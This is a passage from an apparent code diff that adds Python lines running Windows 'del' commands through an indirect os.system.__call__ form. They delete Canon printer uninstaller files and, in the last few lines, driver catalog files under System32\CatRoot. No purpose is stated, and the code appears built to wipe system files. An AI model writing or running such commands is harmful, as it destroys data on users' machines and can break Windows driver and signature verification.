+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstJP.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstKR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNL.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstNO.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPL.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstPT.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstRU.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstSE.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTH.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTR.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstTW.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/RES/STRING/IJInstUS.ini")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/DelDrv64.exe")
+                                                os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/Setup.ini")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{127D0A1D-4EF2-11D1-8608-00C04FC295EE}/HPFusion")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1.CAT")
+                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
+                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
